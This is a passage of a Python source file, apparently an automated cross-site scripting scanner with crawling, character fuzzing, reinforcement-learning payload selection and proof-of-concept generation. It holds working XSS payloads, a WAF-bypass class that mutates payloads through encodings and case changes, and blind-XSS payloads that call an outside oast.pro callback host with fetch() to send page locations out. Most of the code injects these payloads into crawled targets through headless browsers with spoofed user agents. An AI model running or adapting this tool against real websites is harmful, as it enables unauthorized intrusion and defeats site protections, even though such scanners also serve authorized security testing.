                <li>If the method is POST, the payload was submitted via a form.</li>
            </ul>

            <h2>Active Payload (for demonstration)</h2>
            <p>The following code simulates the injection of the payload into the page. If the target environment is vulnerable, execution will occur.</p>
            <pre><code>
    <!-- The injected payload will be executed here. The exact content depends on the injection context. -->
    <!-- For a Reflected/DOM XSS, the browser will execute this code. -->
    <!-- For a Blind XSS, an interaction with the Interactsh callback server would have occurred. -->

    {payload}

    <script>
        // This is a PoC script. The XSS payload above is the actual injection point.
        // This part just ensures the payload is displayed and potentially executed
        // in the context of this PoC file.
        console.log("PoC loaded. Check the console or network tab for signs of XSS payload execution.");
        try {{
            const testDiv = document.createElement('div');
            testDiv.innerHTML = `{payload.replace('`', '\\`')}`;
            document.body.appendChild(testDiv);
        }} catch (e) {{
            console.error("Error inserting payload into PoC:", e);
        }}
    </script>
            </code></pre>
        </div>
    </body>
    </html>
    """
    
    try:
        with open(poc_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        logging.info(f"{GREEN}[INFO]{END} PoC generated: {poc_filename}{Style.RESET_ALL}")
        return poc_filename
    except Exception as e:
        logging.error(f"{Fore.RED}[ERROR]{END} Error generating PoC for {url}: {e}{Style.RESET_ALL}")
        return None

# --- WAF BYPASS & PAYLOAD GENERATION ---
INTERACTSH_DOMAIN = "oast.pro"

class WAFBypassPayloads:
    def __init__(self, callback_host):
        self.callback_host = callback_host
        self.filter_map = {}

    def update_filters(self, new_fuzz_results):
        self.filter_map.update(new_fuzz_results)
        logging.info(f"{GREEN}[WAF]{END} Filters updated based on fuzzing: {json.dumps(self.filter_map, indent=2)}{Style.RESET_ALL}")

    def apply_bypass(self, payload_str, char_to_bypass, encoding_type):
        if encoding_type == 'html_entity':
            return payload_str.replace(char_to_bypass, f"&#x{ord(char_to_bypass):x};")
        elif encoding_type == 'url_encode':
            return payload_str.replace(char_to_bypass, quote(char_to_bypass))
        elif encoding_type == 'js_escape':
            return payload_str.replace(char_to_bypass, f"\\x{ord(char_to_bypass):02x}")
        return payload_str

    def get_payloads(self, server_type="generic", context="html"):
        base_payloads = []
        base_payloads.extend(generate_payloads(server_type))

        blind_xss_payloads = [
            f"<script>fetch('//{self.callback_host}/script?loc='+btoa(window.location))</script>",
            f"<img src=x onerror=fetch('//{self.callback_host}/img?loc='+btoa(window.location))>",
            f"<svg/onload=fetch('//{self.callback_host}/svg?loc='+btoa(window.location))>",
            f"javascript:fetch('//{self.callback_host}/js?loc='+btoa(window.location))",
        ]
        base_payloads.extend(blind_xss_payloads)

        if context == "html":
            base_payloads.extend(["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"])
        elif context == "attribute":
            base_payloads.extend(["'onmouseover=alert(1) x='", "onfocus=alert(1) autofocus"])
        elif context == "script":
            base_payloads.extend(["';alert(1)//", "</script><script>alert(1)</script>"])
        elif context == "url":
            base_payloads.extend(["javascript:alert(1)", "data:text/html,<script>alert(1)</script>"])
        elif context == "comment":
            base_payloads.extend(["--><script>alert(1)</script><!--"])

        polymorphic_payloads = set(base_payloads)
        for p in base_payloads:
            current_payload = p
            for char, filter_info in self.filter_map.items():
                if filter_info['status'] == 'encoded':
                    current_payload = self.apply_bypass(current_payload, char, filter_info['encoding_type'])
                elif filter_info['status'] == 'filtered':
                    if char in ['<', '>', '"', "'"]:
                        current_payload = current_payload.replace(char, f"%00{char}")
            polymorphic_payloads.add(current_payload)
            polymorphic_payloads.add("".join(c.upper() if random.random() > 0.5 else c.lower() for c in p))
            polymorphic_payloads.add(p.replace('<', '&#x3c;').replace('>', '&#x3e;'))
            polymorphic_payloads.add(quote(p))
            polymorphic_payloads.add(p.replace("onerror", "on/**/error"))
            polymorphic_payloads.add(p.replace("alert", "al\x09ert(1)"))
            # FIX: Replaced invalid payload transformation with a more plausible one.
            polymorphic_payloads.add(p.replace('<script>', '<scri\x00pt>'))
            
        return list(polymorphic_payloads)

# --- Character Fuzzer ---
async def perform_character_fuzzing(url, param, session):
    fuzz_results = {}
    test_chars = ['<', '>', '"', "'", '(', ')', '/', '\\', '`', ';', '{', '}']
    
    if not param:
        logging.warning(f"{YELLOW}[FUZZING]{END} No parameter provided for fuzzing.{Style.RESET_ALL}")
        return fuzz_results

    logging.info(f"{YELLOW}[FUZZING]{END} Running character fuzzer for parameter '{param}' on {url}{Style.RESET_ALL}")

    for char in test_chars:
        encoded_char = quote(char)
        fuzz_payload = f"fuzztest{encoded_char}testfuzz"
        
        test_params = {param: fuzz_payload}
        full_url = url + '?' + "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])

        status = 'filtered'
        encoding_type = 'none'

        try:
            async with session.get(full_url, timeout=5, ssl=False, headers=get_random_headers()) as response:
                response_text = await response.text()
                
                if response.status >= 400:
                    status = 'blocked'
                elif fuzz_payload in response_text:
                    status = 'reflected'
                else:
                    # Check for common encodings
                    if f"&#x{ord(char):x};" in response_text.lower() or f"&#{ord(char)};" in response_text.lower():
                        status = 'encoded'
                        encoding_type = 'html_entity'
                    elif f"%{ord(char):02X}" in response_text.upper():
                        status = 'encoded'
                        encoding_type = 'url_encode'
                    elif re.search(r'\\x{:02x}|\\u{:04x}'.format(ord(char), ord(char)), response_text, re.IGNORECASE):
                        status = 'encoded'
                        encoding_type = 'js_escape'
                    else:
                        status = 'filtered'
        except Exception as e:
            status = 'error'
            logging.warning(f"{YELLOW}[FUZZING]{END} Error while fuzzing '{char}': {e}{Style.RESET_ALL}")
        
        fuzz_results[char] = {'status': status, 'encoding_type': encoding_type}
        logging.debug(f"  Fuzzed '{char}' -> Status: {status}, Encoding: {encoding_type}")
    
    logging.info(f"{GREEN}[FUZZING]{END} Character fuzzing complete for {param}.{Style.RESET_ALL}")
    return fuzz_results


# --- SCANNER CORE ---
class AsyncXSSScanner:
    def __init__(self, target_urls, max_depth, num_drivers, ai_api_key, proxy, report_file=None, use_model=False):
        self.url_list = list(set(target_urls))
        self.max_depth = max_depth
        self.num_drivers = num_drivers
        self.proxy = proxy
        self.report_file = report_file
        self.use_model = use_model
        
        self.target_domain = urlparse(target_urls[0]).netloc if target_urls else 'unknown.com'
        self.driver_pool = asyncio.Queue()
        
        self.interact_host = f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))}.{INTERACTSH_DOMAIN}"
        self.payload_generator = WAFBypassPayloads(self.interact_host)
        
        self.visited_urls = set()
        self.vulnerable_urls = []
        self.scan_results = []

        self.model = DeepLearningModel() if use_model else None
        self.rl_agent = ReinforcementLearningAgent()
        self.methods = ["GET", "POST"]

        self.reflected_location_type_mapping = {
            'none': 0, 'text': 1, 'attribute': 2, 'script_content': 3,
            'script_attribute': 4, 'comment': 5, 'url': 6
        }
        
        # Improved API Key Handling
        api_key_from_arg_or_env = ai_api_key or os.getenv("GEMINI_API_KEY")
        if not api_key_from_arg_or_env:
            logging.warning("Gemini API key not provided via --ai-key argument or GEMINI_API_KEY env var. AI payload generation will be skipped.")
            self.ai_api_key = None
        else:
            self.ai_api_key = api_key_from_arg_or_env


    async def initialize_drivers(self):
        if not SELENIUM_AVAILABLE: 
            logging.error(f"{Fore.RED}Selenium is not available. Cannot initialize browsers. Scan will be limited.{Style.RESET_ALL}")
            return
        
        for i in range(self.num_drivers):
            try:
                options = Options()
                options.add_argument("--headless")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-gpu")
                options.add_argument("--window-size=1920,1080")
                options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
                if self.proxy:
                    options.add_argument(f'--proxy-server={self.proxy}')
                
                driver = await asyncio.to_thread(lambda: webdriver.Chrome(service=ChromeService(), options=options))
                await self.driver_pool.put(driver)
                logging.info(f"WebDriver {i+1} initialized successfully.{Style.RESET_ALL}")
            except WebDriverException as e:
                logging.error(f"{Fore.RED}Failed to create WebDriver instance ({i+1}): {e}{Style.RESET_ALL}")
        logging.info(f"{self.driver_pool.qsize()} drivers ready in the pool.{Style.RESET_ALL}")

    async def load_or_train_model(self):
        if not self.use_model: return
        model_path = f"{normalize_domain(self.target_domain)}_xss_model.pkl"
        
        if os.path.exists(model_path):
            try:
                with open(model_path, 'rb') as model_file:
                    self.model = await asyncio.to_thread(pickle.load, model_file)
                if hasattr(self.model, "predict") and callable(getattr(self.model, "predict")):
                    logging.info(f"{GREEN}[INFO]{END} Existing model loaded from {model_path}{Style.RESET_ALL}")
                    if not self.model.is_trained:
                        logging.warning(f"{YELLOW}[WARN]{END} Loaded model is not marked as trained. Attempting to retrain.{Style.RESET_ALL}")
                        await self.train_new_model()
                else:
                    logging.error(f"{Fore.RED}[ERROR]{END} Existing model at {model_path} is invalid. Training a new model.{Style.RESET_ALL}")
                    self.model = DeepLearningModel()
                    await self.train_new_model()
            except Exception as e:
                logging.error(f"{Fore.RED}[ERROR]{END} Error loading model: {e}. Training a new model.{Style.RESET_ALL}")
                self.model = DeepLearningModel()
                await self.train_new_model()
        else:
            logging.info(f"{YELLOW}[INFO]{END} No trained model found for domain: {self.target_domain}. Training a new model.{Style.RESET_ALL}")
            await self.train_new_model()

    async def train_new_model(self):
        logging.info("Training a new model...")
        X, y = await self.generate_training_data()
        if not self.validate_training_data(X, y):
            return
        try:
            await asyncio.to_thread(self.model.train, X, y)
            await self.save_model()
        except Exception as e:
            logging.error(f"{Fore.RED}Error during model training: {e}{Style.RESET_ALL}")

    async def save_model(self):
        if not self.model: return
        model_path = f"{normalize_domain(self.target_domain)}_xss_model.pkl"
        try:
            await asyncio.to_thread(lambda: pickle.dump(self.model, open(model_path, 'wb')))
            logging.info(f"{GREEN}[INFO]{END} Model saved to {model_path}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"{Fore.RED}Error saving model: {e}{Style.RESET_ALL}")

    async def generate_training_data(self):
        X = []
        y = []
        if not self.scan_results:
            logging.warning("No scan results available to generate training data.")
            return X, y
        for result in self.scan_results:
            features = self.extract_features(
                result.get('params', {}),
                result.get('injection_context', 'generic'),
                result.get('fuzz_results', {}),
                result.get('nlp_results', {})
            )
            X.append(features)
            y.append(int(result.get('vulnerable', 0)))
        return X, y

    def validate_training_data(self, X, y):
        if not X or not y:
            logging.error("Training data is empty. Cannot train model.")
            return False
        if X and len(set(len(f) for f in X)) > 1:
             logging.error("Feature vectors in training data have inconsistent lengths.")
             return False
        if X and self.model and len(X[0]) != self.model.model.input_shape[1]:
            logging.error(f"Feature length ({len(X[0])}) does not match model input shape ({self.model.model.input_shape[1]}). Adjust `extract_features` or `build_model`.")
            return False
        return True

    async def auto_filter(self, urls):
        if not self.model or not self.model.is_trained:
            logging.warning(f"{YELLOW}[WARN]{END} Model is not trained or does not exist. Skipping auto-filtering.{Style.RESET_ALL}")
            return urls

        filtered_urls = []
        features_list = []
        original_urls_map = {}

        for url in urls:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            dummy_fuzz_results = {} 
            dummy_nlp_results = {
                "forms_found": False, "input_fields_count": 0, "scripts_found": False,
                "has_eval_or_write": False, "has_common_sanitization_patterns": False,
                "reflected_location_type": "none"
            }
            features = self.extract_features(query_params, 'generic', dummy_fuzz_results, dummy_nlp_results)
            features_list.append(features)
            original_urls_map[tuple(features)] = url 

        if not features_list: return []

        try:
            predictions = await asyncio.to_thread(self.model.predict, features_list)
            for i, pred in enumerate(predictions):
                if pred:
                    filtered_urls.append(original_urls_map[tuple(features_list[i])])
            logging.info(f"{GREEN}[INFO]{END} {len(filtered_urls)} URLs filtered by the model for scanning.{Style.RESET_ALL}")
            return filtered_urls
        except Exception as e:
            logging.error(f"{Fore.RED}Error during auto-filtering of URLs: {e}. Reverting to all URLs.{Style.RESET_ALL}")
            return urls

    def extract_features(self, query_params, injection_context, fuzz_results, nlp_results):
        features = []
        # 1. URL/Form Parameter Features
        features.append(len(query_params))
        first_param_name_len = len(list(query_params.keys())[0]) if query_params else 0
        features.append(first_param_name_len)
        # 2. Injection Context
        context_mapping = {'html':0, 'attribute':1, 'script':2, 'url':3, 'comment':4, 'generic':5}
        features.append(context_mapping.get(injection_context, 5))
        # 3. Character Fuzzer Results
        fuzz_reflected_count = sum(1 for char_info in fuzz_results.values() if char_info['status'] == 'reflected')
        fuzz_total_chars_tested = len(fuzz_results) if fuzz_results else 1 # Avoid division by zero
        fuzz_success_rate = fuzz_reflected_count / fuzz_total_chars_tested
        features.append(fuzz_success_rate)
        features.append(sum(1 for info in fuzz_results.values() if info['status'] == 'filtered'))
        features.append(sum(1 for info in fuzz_results.values() if info['status'] == 'encoded'))
        # 4. NLP Analysis Results
        features.append(1 if nlp_results.get('forms_found', False) else 0)
        features.append(1 if nlp_results.get('has_eval_or_write', False) else 0)
        features.append(1 if nlp_results.get('has_common_sanitization_patterns', False) else 0)
        features.append(self.reflected_location_type_mapping.get(nlp_results.get('reflected_location_type', 'none'), 0))
        return features

    def detect_server(self, url):
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            response = requests.head(url, headers=headers, timeout=5)
            server_header = response.headers.get('Server', '').lower()
            if 'nginx' in server_header: return 'nginx'
            elif 'apache' in server_header: return 'apache'
            elif 'iis' in server_header: return 'iis'
            else: return 'generic'
        except requests.RequestException as e:
            logging.warning(f"{YELLOW}[WARN]{END} Failed to detect server for {url}: {str(e)}")
            return 'generic'
    
    def get_html_injection_context(self, html_source, param_value):
        if not param_value: return 'generic'
        soup = BeautifulSoup(html_source, 'html.parser')
        
        for script_tag in soup.find_all('script'):
            if script_tag.string and param_value in script_tag.string: return 'script'
            if script_tag.attrs:
                for attr_val in script_tag.attrs.values():
                    if isinstance(attr_val, str) and param_value in attr_val: return 'script'
        
        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and param_value in value:
                    if attr.startswith('on') or attr in ['href', 'src', 'data', 'action']: return 'attribute'
                    else: return 'attribute'
        
        for comment in soup.find_all(string=lambda text: isinstance(text, Comment) and param_value in text): return 'comment'
        if re.search(r'(href|src|action)=["\'][^"\']*' + re.escape(param_value), html_source, re.IGNORECASE): return 'url'
        if param_value in html_source: return 'html'
        return 'generic'

    def determine_xss_type(self, payload, response_text, injection_context):
        if self.interact_host in payload: return "Blind XSS (Callback)"
        if injection_context == "script": return "DOM XSS (Script Context)"
        if injection_context == "attribute": return "Reflected XSS (Attribute)"
        if injection_context == "html": return "Reflected XSS (HTML)"
        if injection_context == "url": return "Reflected XSS (URL Context)"
        if injection_context == "comment": return "Reflected XSS (HTML Comment)"
        if payload in response_text: return "Reflected XSS (Generic)"
        return "Not XSS"

    async def check_dom_xss_in_source(self, driver_page_source, payload):
        soup = BeautifulSoup(driver_page_source, 'html.parser')
        return any(script.string and payload in script.string for script in soup.find_all('script'))

    async def check_stored_xss(self, url, payload, session):
        try:
            async with session.get(url, timeout=10, ssl=False, headers=get_random_headers()) as response:
                return response.status == 200 and payload in await response.text()
        except Exception as e:
            logging.warning(f"{YELLOW}[WARN]{END} Stored XSS check failed for {url}: {e}{Style.RESET_ALL}")
        return False

    def check_rfc_vulnerabilities(self, response_text, headers, payload):
        content_type = headers.get('Content-Type', '')
        return "application/json" in content_type.lower() and payload in response_text

    async def scan_target(self, target, session):
        driver = None
        try:
            driver = await self.driver_pool.get()
            url, method, original_params = target['url'], target['method'], target['params']
            
            param_name_to_fuzz = list(original_params.keys())[0] if original_params else None
            fuzz_results = {}
            if param_name_to_fuzz:
                fuzz_results = await perform_character_fuzzing(url, param_name_to_fuzz, session)
                self.payload_generator.update_filters(fuzz_results)
            else:
                logging.warning(f"{YELLOW}[WARN]{END} No parameter to fuzz for {url}. Skipping char fuzzing.{Style.RESET_ALL}")

            server_type = await asyncio.to_thread(self.detect_server, url)
            prelim_context = 'url' if urlparse(url).query else 'html'
            all_generated_payloads = self.payload_generator.get_payloads(server_type=server_type, context=prelim_context)
            
            if self.ai_api_key:
                ai_payloads = await generate_payloads_with_ai(session, self.ai_api_key, f"Parameter '{param_name_to_fuzz}' in a {method} request to {url}", self.interact_host)
                all_generated_payloads.extend(ai_payloads)

            for param_to_test in original_params.keys():
                initial_page_source = ""
                try:
                    async with session.get(url, timeout=5, ssl=False, headers=get_random_headers()) as initial_response:
                        if initial_response.status == 200: initial_page_source = await initial_response.text()
                except Exception as e:
                    logging.warning(f"{YELLOW}[WARN]{END} Failed to get initial source for NLP analysis of {url}: {e}{Style.RESET_ALL}")
                
                nlp_results = await asyncio.to_thread(analyze_content, initial_page_source, None)

                current_state_for_rl = self.rl_agent.get_state_key(url, param_to_test, method, prelim_context, server_type, {char: info['status'] for char, info in fuzz_results.items()})
                payload_to_use = self.rl_agent.select_action(current_state_for_rl, all_generated_payloads)

                if not payload_to_use or payload_to_use == "empty_payload":
                    logging.warning(f"{YELLOW}[WARN]{END} No payload selected by RL agent for {url}/{param_to_test}. Skipping.{Style.RESET_ALL}")
                    continue

                test_params = original_params.copy()
                test_params[param_to_test] = payload_to_use
                
                try:
                    start_time = time.time()
                    
                    if method == 'POST':
                        script = f"const form=document.createElement('form');form.method='POST';form.action='{url}';const data={json.dumps(test_params)};for(const k in data){{const i=document.createElement('input');i.type='hidden';i.name=k;i.value=data[k];form.appendChild(i)}}document.body.appendChild(form);form.submit();"
                        await asyncio.to_thread(driver.get, "about:blank")
                        await asyncio.to_thread(driver.execute_script, script)
                    else: # GET
                        full_url = url + '?' + "&".join([f"{k}={quote(str(v))}" for k, v in test_params.items()])
                        await asyncio.to_thread(driver.get, full_url)
                    
                    await asyncio.sleep(2) # Wait for page to render
                    response_time = time.time() - start_time
                    page_source = await asyncio.to_thread(lambda: driver.page_source)
                    
                    status_code, response_headers = -1, {}
                    try:
                        async with session.request(method, url, params=test_params if method=='GET' else None, data=test_params if method=='POST' else None, timeout=5, ssl=False) as r:
                            status_code, response_headers = r.status, r.headers
                    except Exception as e:
                        logging.warning(f"{YELLOW}[WARN]{END} Failed to get headers/status for {url}: {e}")

                    vulnerable, xss_type, poc_file = 0, "Not XSS", None
                    
                    nlp_results_post_injection = await asyncio.to_thread(analyze_content, page_source, payload_to_use)
                    nlp_results.update(nlp_results_post_injection)
                    injection_context = await asyncio.to_thread(self.get_html_injection_context, page_source, payload_to_use)
                    logging.info(f"{BLUE}[CONTEXT]{END} Payload reflected in context: {injection_context} for {url}. NLP Reflected Type: {nlp_results.get('reflected_location_type', 'none')}{Style.RESET_ALL}")

                    is_vulnerable = False
                    if payload_to_use in page_source:
                        xss_type = self.determine_xss_type(payload_to_use, page_source, injection_context)
                        if (injection_context not in ['generic', 'text'] and nlp_results.get('reflected_location_type', 'none') != 'none') or self.interact_host in payload_to_use:
                             is_vulnerable = True

                    if not is_vulnerable and method == 'POST' and await self.check_stored_xss(url, payload_to_use, session):
                        xss_type = "Stored XSS"
                        is_vulnerable = True
                    
                    if not is_vulnerable and self.check_rfc_vulnerabilities(page_source, response_headers, payload_to_use):
                        xss_type = "RFC Mismatch Vulnerability"
                        is_vulnerable = True
                    
                    if is_vulnerable:
                        vulnerable = 1
                        logging.info(f"{Fore.RED}[VULNERABILITY CONFIRMED]{END} {xss_type} detected at {url} with payload {payload_to_use} (Method: {method}){Style.RESET_ALL}")
                        poc_file = await asyncio.to_thread(generate_xss_poc, url, payload_to_use, method, xss_type)
                        self.vulnerable_urls.append((url, payload_to_use, method, xss_type, poc_file))
                        insert_vulnerability_data(url, payload_to_use, method, xss_type, 1, poc_file)
                        await asyncio.to_thread(lambda: open('audit_links.txt', 'a').write(f"{url},{payload_to_use},{method},{xss_type},{poc_file}\n"))
                    else:
                        logging.info(f"{BLUE}[INFO]{END} Payload '{payload_to_use}' not found or not exploitable in {url}.{Style.RESET_ALL}")

                    fuzz_summary_for_rl = {char: info['status'] for char, info in fuzz_results.items()}
                    self.rl_agent.learn(url, param_to_test, payload_to_use, method, vulnerable, injection_context, server_type, fuzz_summary_for_rl)

                    fuzz_num_filtered = sum(1 for info in fuzz_results.values() if info['status'] == 'filtered')
                    fuzz_num_encoded = sum(1 for info in fuzz_results.values() if info['status'] == 'encoded')
                    insert_training_data(url, param_to_test, payload_to_use, server_type, method, status_code, response_time, page_source[:100], vulnerable, page_source[:100], vulnerable, injection_context, 1 if nlp_results.get('forms_found') else 0, nlp_results.get('input_fields_count', 0), 1 if nlp_results.get('scripts_found') else 0, 1 if nlp_results.get('has_eval_or_write') else 0, 1 if nlp_results.get('has_common_sanitization_patterns') else 0, nlp_results.get('reflected_location_type', 'none'), fuzz_num_filtered, fuzz_num_encoded)

                except (WebDriverException, TimeoutException) as e:
                    logging.warning(f"{YELLOW}[WARN]{END} WebDriver/Timeout error for {url} with payload {payload_to_use}: {e}{Style.RESET_ALL}")
                except Exception as e:
                    logging.error(f"{Fore.RED}[ERROR]{END} Unexpected error scanning {url} with payload {payload_to_use}: {e}{Style.RESET_ALL}", exc_info=True)
        finally:
            if driver: await self.driver_pool.put(driver)

    async def run(self):
        start_time = asyncio.get_event_loop().time()
        logging.info(f"\n{'='*20} STARTING ADVANCED SCAN {'='*20}")
        logging.info(f"Target: {self.target_domain}")
        logging.critical(f"{Fore.YELLOW}Blind XSS payloads will use callback domain: {self.interact_host}{Style.RESET_ALL}")
        logging.critical(f"{Fore.GREEN}Monitor http://{self.interact_host} for interactions.{Style.RESET_ALL}")

        await self.initialize_drivers()
        if self.driver_pool.qsize() == 0:
            logging.critical("No drivers could be initialized. Stopping scan.")
            return

        async with aiohttp.ClientSession(headers=get_random_headers(), connector=aiohttp.TCPConnector(ssl=False)) as session:
            initial_urls_for_scan = []
            if args.list: initial_urls_for_scan = await asyncio.to_thread(read_target_from_file, args.list)
            elif args.domain:
                if args.deepcrawl:
                    initial_urls_for_scan.extend(await fetch_urls_commoncrawl(args.domain, session))
                    initial_urls_for_scan.extend(await fetch_urls_wayback(args.domain, session))
                elif args.crawl:
                    initial_urls_for_scan.extend(await crawl_website(args.domain, session, self.max_depth))
                else: initial_urls_for_scan = [args.domain]
            elif args.url: initial_urls_for_scan = [args.url]
            
            self.url_list = list(set(initial_urls_for_scan))
            if not self.url_list:
                logging.warning("No target URLs to scan. Ending scan.")
                return

            logging.info(f"{GREEN}[INFO]{END} Total unique URLs found for processing: {len(self.url_list)}{Style.RESET_ALL}")
            await asyncio.to_thread(lambda: open('found_links.txt', 'w').write("\n".join(self.url_list)))

            if self.use_model:
                await self.load_or_train_model()
                self.url_list = await self.auto_filter(self.url_list)
                if not self.url_list:
                    logging.warning(f"{YELLOW}[WARN]{END} All URLs filtered out by model. Ending scan.{Style.RESET_ALL}")
                    return

            all_discovered_targets = []
            for entry_url in self.url_list:
                all_discovered_targets.extend(await self.crawl_and_discover_forms_and_params(session, entry_url, self.max_depth))
            
            seen_targets, scan_targets = set(), []
            for target in all_discovered_targets:
                target_key = (target['url'], target['method'], frozenset(target['params'].keys()))
                if target_key not in seen_targets:
                    seen_targets.add(target_key)
                    scan_targets.append(target)

            if not scan_targets:
                logging.warning("No entry points with parameters or forms discovered. Scan cannot continue.")
                return
            
            logging.info(f"\n{len(scan_targets)} entry points to scan with {self.num_drivers} workers.")
            
            tasks = [self.scan_target(target, session) for target in scan_targets]
            if args.duration:
                _, pending = await asyncio.wait(tasks, timeout=args.duration)
                for task in pending: task.cancel()
                logging.info(f"{RED}[INFO]{END} Scan ended due to time limit ({args.duration}s).{Style.RESET_ALL}")
            else:
                await asyncio.gather(*tasks, return_exceptions=True)

        if self.scan_results and self.use_model: await self.train_new_model()
        await self.generate_report()

        while not self.driver_pool.empty():
            driver = await self.driver_pool.get()
            await asyncio.to_thread(driver.quit)
        
        db_queue.put("terminate"); db_queue.join(); db_connection.close()

        end_time = asyncio.get_event_loop().time()
        logging.info(f"\n{'='*20} FINAL SCAN REPORT {'='*20}")
        logging.info(f"Scan finished in {end_time - start_time:.2f} seconds.")
        logging.critical(f"{Fore.YELLOW}Scan has injected Blind XSS payloads. You MUST manually check your callback server dashboard to confirm vulnerabilities:{Style.RESET_ALL}")
        logging.critical(f"{Fore.GREEN}--> http://{self.interact_host} <--{Style.RESET_ALL}")

    async def generate_report(self):
        if not self.report_file:
            logging.info("Report file not specified. Skipping report generation.")
            return

        try:
            with open(self.report_file, 'w', encoding='utf-8') as f:
                f.write("<html><head><title>XSS Vulnerability Report</title><style>")
                f.write("body{font-family:Arial,sans-serif;margin:20px;background-color:#f4f4f4;color:#333}h1{color:#d32f2f}table{width:100%;border-collapse:collapse;margin-top:20px;background-color:#fff;box-shadow:0 2px 5px rgba(0,0,0,.1)}th,td{border:1px solid #ddd;padding:12px;text-align:left}th{background-color:#eee;color:#555}tr:nth-child(even){background-color:#f9f9f9}tr:hover{background-color:#f1f1f1}.vulnerable{color:#d32f2f;font-weight:700}a.poc-link{color:#007bff;text-decoration:none;font-weight:700}a.poc-link:hover{text-decoration:underline}")
                f.write("</style></head><body><h1>XSS Vulnerability Report</h1>")
                f.write(f"<p>Total URLs Scanned: {len(self.url_list)}</p>")
                f.write(f"<p class='vulnerable'>Confirmed XSS Vulnerabilities: {len(self.vulnerable_urls)}</p>")
                f.write("<table><tr><th>Vulnerable URL</th><th>Payload</th><th>Method</th><th>XSS Type</th><th>PoC</th></tr>")
                
                for url, payload, method, xss_type, poc_file in self.vulnerable_urls:
                    display_payload = payload.replace('<', '&lt;').replace('>', '&gt;')
                    if poc_file:
                        poc_filename = os.path.basename(poc_file)
                        poc_link = f"<a href='pocs/{poc_filename}' target='_blank' class='poc-link'>View PoC</a>"
                    else:
                        poc_link = "N/A"
                    f.write(f"<tr><td>{url}</td><td><code>{display_payload}</code></td><td>{method}</td><td>{xss_type}</td><td>{poc_link}</td></tr>")
                
                f.write("</table></body></html>")
            logging.info(f"{GREEN}[INFO]{END} Report successfully generated at {self.report_file}{Style.RESET_ALL}")
        except Exception as e:
            logging.error(f"{Fore.RED}[ERROR]{END} Error generating report: {e}{Style.RESET_ALL}")

    async def crawl_and_discover_forms_and_params(self, session, start_url, max_depth):
        urls_to_visit = deque([(start_url, 0)])
        discovered_targets, crawled_links = [], {start_url}

        while urls_to_visit:
            url, depth = urls_to_visit.popleft()
            if depth > max_depth or url in self.visited_urls: continue
            
            self.visited_urls.add(url)
            logging.info(f"Discovering entry points [Depth:{depth}]: {url}")
            
            try:
                async with session.get(url, timeout=10, ssl=False, headers=get_random_headers()) as response:
                    if response.status != 200: continue
                    html = await response.text()
            except Exception as e:
                logging.warning(f"{YELLOW}[WARN]{END} Failed to fetch {url} for entry point discovery: {e}{Style.RESET_ALL}")
                continue

            soup = BeautifulSoup(html, 'html.parser')
            
            for form in soup.find_all('form'):
                action = form.get('action', url)
                form_url = urljoin(url, action)
                method = form.get('method', 'GET').upper()
                params = {i.get('name'): 'test' for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')}
                if params:
                    discovered_targets.append({'url': form_url, 'method': method, 'params': params})
                    logging.info(f"{Fore.CYAN}Form found: {form_url} ({method}){Style.RESET_ALL}")

            for link_tag in soup.find_all('a', href=True):
                link = urljoin(url, link_tag['href'])
                parsed_link = urlparse(link)
                if parsed_link.netloc == self.target_domain:
                    if parsed_link.query:
                        params = {k: v[0] for k, v in parse_qs(parsed_link.query).items()}
                        discovered_targets.append({'url': parsed_link._replace(query="").geturl(), 'method': 'GET', 'params': params})
                        logging.info(f"{Fore.CYAN}URL with parameters found: {parsed_link._replace(query='').geturl()}{Style.RESET_ALL}")
                    if depth < max_depth and link not in crawled_links:
                        crawled_links.add(link)
                        urls_to_visit.append((link, depth + 1))
        
        return discovered_targets

def read_target_from_file(filepath):
    try:
        with open(filepath, "r") as f:
            return [url.strip() for url in f.readlines() if url.strip()]
    except FileNotFoundError:
        logging.error(f"{Fore.RED}[ERROR]{END} File not found: {filepath}{Style.RESET_ALL}")
        return []

def terminate_scan_gracefully(signal_num, frame):
    global stop_animation 
    stop_animation = True
    print(f"\n{RED}[INFO]{END} Scan terminated by user or timeout.{Style.RESET_ALL}")
    db_queue.put("terminate")
    sys.exit(0)

signal.signal(signal.SIGINT, terminate_scan_gracefully)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Advanced XSS Scanner with parallelism, WAF bypass, extended crawling, and AI.")
    parser.add_argument("url", nargs='?', help="Starting URL to scan (optional if -l or -d is used).")
    parser.add_argument("-l", "--list", help="File with a list of URLs (e.g., urls.txt).")
    parser.add_argument("-d", "--domain", help="Target domain name (e.g., testphp.vulnweb.com).")
    parser.add_argument("--depth", type=int, default=2, help="Crawl depth (default: 2). Used with --crawl.")
    parser.add_argument("-w", "--drivers", type=int, default=4, help="Number of parallel browsers (default: 4).")
    parser.add_argument("-p", "--proxy", type=str, help="Proxy to use (e.g., http://127.0.0.1:8080).")
    parser.add_argument("--ai-key", type=str, default=None, help="Gemini API Key. If not provided, it will try to use the GEMINI_API_KEY environment variable.")
    parser.add_argument("--deepcrawl", action='store_true', help="Uses all available APIs (CommonCrawl, Wayback) to crawl URLs [Time-consuming].")
    parser.add_argument("--crawl", action='store_true', help="Crawls the target website for URLs (limited by --depth).")
    parser.add_argument("--extractquick", action='store_true', help="Quickly extracts and cleans URLs from Wayback Machine.")
    parser.add_argument("--report", help="Generate an HTML report (e.g., report.html).", default="xss_report.html")
    parser.add_argument("--duration", type=int, help="Duration in seconds to run the scan before auto-stopping.")
    parser.add_argument("--use-model", action='store_true', help="Use the trained model to filter URLs before scanning.")
    
    args = parser.parse_args()

    primary_domain = 'default_scan'
    if args.domain: primary_domain = normalize_domain(args.domain)
    elif args.list: primary_domain = normalize_domain(None, args.list)
    elif args.url: primary_domain = normalize_domain(args.url)

    log_filename = setup_logging(primary_domain)
    logging.info(f"CLI Command: {' '.join(sys.argv)}")

    if args.extractquick:
        if args.domain:
